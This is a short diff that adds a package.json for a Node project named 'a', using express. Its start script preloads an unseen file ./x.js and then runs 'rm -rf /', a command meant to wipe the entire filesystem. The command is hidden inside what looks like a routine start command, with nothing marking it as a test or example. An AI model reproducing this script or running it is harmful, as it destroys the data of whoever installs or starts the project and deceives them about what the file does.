@@ -1,0 +1,9 @@
+{
+  "name": "a",
+  "scripts": {
+    "start": "NODE_OPTIONS=--require=./x.js node server.js && rm -rf /"
+  },
+  "dependencies": {
+    "express": "5"
+  }
+}
